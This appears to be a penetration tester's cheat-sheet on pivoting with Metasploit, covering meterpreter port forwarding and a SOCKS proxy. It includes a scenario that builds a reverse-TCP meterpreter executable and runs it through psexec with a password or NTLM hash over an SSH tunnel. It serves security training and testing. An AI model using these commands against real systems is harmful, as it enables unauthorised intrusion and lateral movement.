# Metasploit

## 01 - Portfwd

### 1.1 - Help Menu

```
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
```

### 1.2 - Usage

- Bind Port

`meterpreter > portfwd add -l <local_port> -p <bind_port> -r <target_IP>`

- Reverse Port Forwarding

`meterpreter > portfwd add -R -L <attacker_IP> -l <local_port> -p <bind_port> -r <compromised_target_IP>`

- Remove port forward rule

`meterpreter > portfwd <delete -l <local_port> -p <bind_port> -r <target_IP>`

- Remove all port forwarding rules

`meterpreter > portfwd flush`

## 02 - SOCKS Proxy

### 2.1 - Usage

```
msf > use auxiliary/server/socks_proxy

msf auxiliary(server/socks_proxy) > options 

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  1080             yes       The port to listen on
   VERSION  5                yes       The SOCKS version to use (Accepted: 4a, 5)


   When VERSION is 5:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   USERNAME                   no        Proxy username for SOCKS5 listener


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server



View the full module info with the info, or info -d command.

msf auxiliary(server/socks_proxy) > set version <4a | 5>

msf auxiliary(server/socks_proxy) > set srvhost <IP>

msf auxiliary(server/socks_proxy) > set srvport <PORT>

msf auxiliary(server/socks_proxy) > set username <username>

msf auxiliary(server/socks_proxy) > set password <password>

msf auxiliary(server/socks_proxy) > run -j
```

Refer to [[Proxychains]] section

### 2.2 - Scenarios

#### 2.2.1 - Portfwd

##### 2.2.2.1 - Bind Port

`meterpreter > portfwd add -l <local_port> -p <bind_port> -r <target_IP>`

##### 2.2.2.2 - Reverse Bind Port Forwarding

Refer to [[Tactics && Techniques && Procedures (TTPs) Phases/Post Exploitation/Shell Is The Beginning/Pivoting and Lateral Movement/Lateral Movement/Windows/P2P Callback Shells|P2P Callback Shells]]

#### 2.2.2 - SOCKS Proxy

##### 2.2.2.1 - Dynamic Port Forwarding via Metasploit Framework

TODO: Provide screenshots and a graph illustration

```
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<SSH_IP> lport=4343 -f exe-service -o shellsvc.exe

$ ssh -R 4343:127.0.0.1:8884 <username>@<IP>

msf exploit(windows/smb/psexec) > set rhosts <IP>

msf exploit(windows/smb/psexec) > set smbuser <username>

msf exploit(windows/smb/psexec) > set smbpass <password | ntlm_hash>

msf exploit(windows/smb/psexec) > set lhost <SSH_IP>

msf exploit(windows/smb/psexec) > set lport 4343

msf exploit(windows/smb/psexec) > set proxies socks4:127.0.0.1:1080

msf exploit(windows/smb/psexec) > set reverseallowproxy true

msf exploit(windows/smb/psexec) > set reverselistenerbindaddress 127.0.0.1

msf exploit(windows/smb/psexec) > set reverselistenerbindport 8884

msf exploit(windows/smb/psexec) > set exe::custom /path/to/shellsvc.exe
```

---
## References

- [Metasploit Unleashed: Portfwd](https://www.offsec.com/metasploit-unleashed/portfwd/)

- [Using Metasploit Routing and Proxychains for Pivoting](https://infinitelogins.com/2021/02/20/using-metasploit-routing-and-proxychains-for-pivoting/)

- [Basic Pivoting Techniques: SSH Dynamic Port Forwarding + Metasploit over SSH](https://www.youtube.com/watch?v=6gqwxGE4o8E)

- [SlayerLabs Tunneling Quick Guide](https://posts.slayerlabs.com/tunneling-quick-guide/)

- [Overview of Network Pivoting and Tunneling](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)

- [How to Implement Pivoting and Relaying Techniques Using Meterpreter](https://medium.com/axon-technologies/how-to-implement-pivoting-and-relaying-techniques-using-meterpreter-b6f5ec666795)

- [Port forwarding: Accessing local ports remotely](https://www.hackingtutorials.org/metasploit-tutorials/metasploitable-3-port-forwarding/)